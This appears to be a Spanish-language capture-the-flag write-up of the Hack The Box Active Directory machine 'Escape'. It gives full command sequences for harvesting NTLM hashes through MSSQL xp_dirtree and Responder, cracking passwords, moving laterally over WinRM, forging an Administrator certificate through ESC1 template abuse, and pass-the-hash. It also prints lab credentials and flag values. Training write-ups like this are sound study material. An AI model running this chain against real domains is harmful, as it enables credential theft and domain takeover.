---
tags:
  - CTF
  - estado/incompleto
  - windows
  - OSCP
  - activeDirectory
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/531
dificultad: Media
ip: 10.10.11.202
os: Windows
relacionados:
  - "[[Hash NTLM]]"
  - "[[Active Directory Certificate Services (ESC1)]]"
  - "[[Pass-the-Hash (PtH)]]"
  - "[[Certificados (PKINIT)]]"
---
# HackTheBox - Escape

## Reconocimiento

### Escaneo de Puertos con Nmap

Mi primer paso fue realizar un escaneo completo de los puertos de la máquina para identificar los servicios en ejecución. Utilicé `nmap` con una alta velocidad para detectar rápidamente los puertos abiertos y luego ejecuté un segundo escaneo más detallado sobre esos puertos para obtener versiones de servicios y ejecutar scripts de enumeración básicos.

```Bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.202 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.202
```

El resultado reveló una gran cantidad de puertos abiertos, lo cual es un claro indicio de que estoy ante un entorno de **Active Directory**. Destacaba el puerto **1433**, correspondiente a **MSSQL**. Además, el escaneo identificó dos nombres de host: `sequel.htb` (el dominio) y `dc.sequel.htb` (probablemente el controlador de dominio). Para facilitar la resolución de nombres, los añadí a mi archivo `/etc/hosts`.
```Bash
echo "10.10.11.202 sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

Un detalle importante que noté fue una diferencia horaria de 8 horas entre mi máquina y el servidor. Esto es crucial, ya que **Kerberos** requiere una sincronización de tiempo de 5 minutos o menos para funcionar correctamente, algo que tendré que corregir más adelante.

---

### Enumeración del Servicio SMB

Dado que no había un sitio web visible, mi siguiente objetivo fue el servicio SMB. Utilicé `smbclient` para listar los recursos compartidos, autenticándome como invitado (guest) al presionar "Enter" cuando se me solicitó una contraseña.
```Bash
smbclient -L \\\\sequel.htb\\
```

Entre los recursos compartidos estándar, encontré uno llamado `Public`. Me conecté a él para investigar su contenido.
```Bash
smbclient \\\\sequel.htb\\public
```

Dentro, encontré un archivo PDF llamado `SQL Server Procedures.pdf`. Lo descargué usando el comando `get`. Al revisar el contenido del PDF, hallé credenciales de acceso para el servicio MSSQL: `PublicUser:GuestUserCantWrite1`.

## Explotación de vulnerabilidades

### Captura de Hash NTLMv2 desde MSSQL

Con las credenciales del PDF, intenté conectarme al servidor MSSQL usando `impacket-mssqlclient`.
```Bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

Aunque obtuve acceso, no encontré nada de interés inmediato en la base de datos. Sin embargo, se me ocurrió una idea: forzar al servicio MSSQL a autenticarse contra mi máquina para capturar su hash NTLM. Si el servicio se ejecuta con una cuenta de usuario, es muy probable que pueda crackear la contraseña.

Para ello, primero puse a la escucha a `Responder` en mi máquina.
```Bash
responder -I tun0 -v
```

Luego, desde la sesión de MSSQL, ejecuté el procedimiento almacenado `xp_dirtree` apuntando a una ruta UNC (Universal Naming Convention) que dirigía a mi máquina.

> [!NOTE] Técnica de captura de hash con xp_dirtree
> 
> El procedimiento xp_dirtree se utiliza para listar el contenido de un directorio. Cuando se le proporciona una ruta UNC (como \\<mi_ip>\share), el servidor MSSQL intentará conectarse a ese recurso compartido. Este intento de conexión inicia un proceso de autenticación NTLM con mi máquina, lo que permite que una herramienta como Responder capture el hash de la cuenta de servicio que ejecuta MSSQL.

```SQL
xp_dirtree '\\10.10.14.17\test'
```

Inmediatamente, `Responder` capturó el hash NTLMv2 de la cuenta de servicio `sql_svc`.

---

### Craking de Hash y Acceso Inicial

El hash capturado correspondía a una cuenta de usuario, no a una cuenta de máquina, lo que aumentaba mis posibilidades de éxito. Guardé el hash en un archivo y usé `John the Ripper` con el diccionario `rockyou.txt` para crackearlo.
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

¡Éxito! La contraseña para el usuario `sql_svc` era **REGGIE1234ronnie**. Con estas credenciales, obtuve una sesión interactiva en la máquina a través de **WinRM** usando `evil-winrm`.
```Bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

---

### Movimiento Lateral hacia Ryan.Cooper

Aunque ya estaba dentro del sistema como `sql_svc`, no tenía permisos para leer la flag de usuario. Al listar los directorios de usuarios, encontré un perfil para `Ryan.Cooper`.
```PowerShell
ls C:\users
```

Continué enumerando y encontré un archivo de log del servicio MSSQL en `C:\sqlserver\Logs\ERRORLOG.bak`. Al inspeccionarlo, descubrí un intento de inicio de sesión fallido del usuario `ryan.cooper` que revelaba una posible contraseña.

> [!TIP] Fuga de credenciales en logs
> 
> type C:\sqlserver\Logs\ERRORLOG.bak
> 
> En el log aparecía un registro de autenticación fallida donde el usuario `ryan.cooper` intentó usar la contraseña `NuclearMosquito3`. Es común que los usuarios reutilicen contraseñas, así que valía la pena probarla.

Utilicé esta contraseña para autenticarme como `ryan.cooper` a través de WinRM y logré acceder a su sesión, donde finalmente pude leer la flag de usuario.
```Bash
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

## Escalada de privilegios

### Enumeración de Active Directory Certificate Services (AD CS)

Recordando el escaneo inicial de Nmap, la presencia de múltiples puertos relacionados con certificados (como el puerto 9389 para AD CS) sugería que había una Entidad Certificadora (CA) en el dominio. Decidí investigar posibles misconfiguraciones en los **Active Directory Certificate Services**.

Para ello, subí la herramienta [Certify.exe](https://github.com/GhostPack/Certify) a la máquina y la ejecuté para confirmar la existencia de una CA.
```PowerShell
upload Certify.exe
.\Certify.exe cas
```

La herramienta confirmó que existía una CA llamada `sequel-dc-ca`. El siguiente paso fue buscar plantillas de certificados vulnerables.
```PowerShell
.\Certify.exe find /vulnerable
```

---

### Explotación de ESC1

El resultado de `Certify.exe` fue revelador: encontré una plantilla vulnerable llamada `UserAuthentication`.

> [!DANGER] Vulnerabilidad ESC1: Suplantación de identidad
> 
> La plantilla UserAuthentication era vulnerable a un ataque conocido como ESC1. Esta vulnerabilidad se produce por una combinación peligrosa de permisos:
> 
> 1. **Permisos de inscripción:** El grupo `Authenticated Users` (al que pertenezco como `ryan.cooper`) podía solicitar certificados usando esta plantilla.
>     
> 2. **Control del solicitante:** La plantilla tenía el flag `ENROLLEE_SUPPLIES_SUBJECT` activado.
>     
> 
> Esta configuración me permite, como un usuario de bajos privilegios, solicitar un certificado y especificar en él un **Nombre Alternativo de Sujeto (SAN)** arbitrario. Decidí usar esta capacidad para solicitar un certificado a nombre del usuario `Administrator`, lo que efectivamente me permitiría suplantar su identidad.

Para ejecutar el ataque, utilicé la herramienta `certipy` desde mi máquina. Solicité un certificado para `administrator@sequel.htb` usando mis credenciales de `ryan.cooper`.
```Bash
certipy-ad req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -dc-ip 10.10.11.202
```

---

### Autenticación con Certificado y Obtención de Hash

Con el certificado del Administrador en mi poder (guardado como `administrator.pfx`), el siguiente paso era usarlo para autenticarme mediante Kerberos y obtener el hash NTLM del administrador. Antes de hacerlo, sincronicé el reloj de mi sistema con el del controlador de dominio para evitar problemas con Kerberos.
```Bash
sudo ntpdate -u dc.sequel.htb
```

Luego, usé `certipy` de nuevo para realizar la autenticación con el certificado, obtener un **Ticket Granting Ticket (TGT)** de Kerberos y extraer el hash NTLM del Administrador.
```Bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

Finalmente, con el hash NTLM del Administrador, utilicé la técnica **Pass-the-Hash** con `evil-winrm` para obtener una sesión con privilegios de administrador en el sistema y leer la flag de `root.txt`.
```Bash
evil-winrm -i sequel.htb -u administrator -H <HASH_NTLM_ADMINISTRADOR>
```


---


## Bandera(s)

> [!FLAG] `flag{user}`
> 9d6a7558c8ed329ed3170b876019f2ca
^bandera

> [!FLAG] `flag{root}`
> 2d7c05880dfd5ab71bec348c7b32877a
^bandera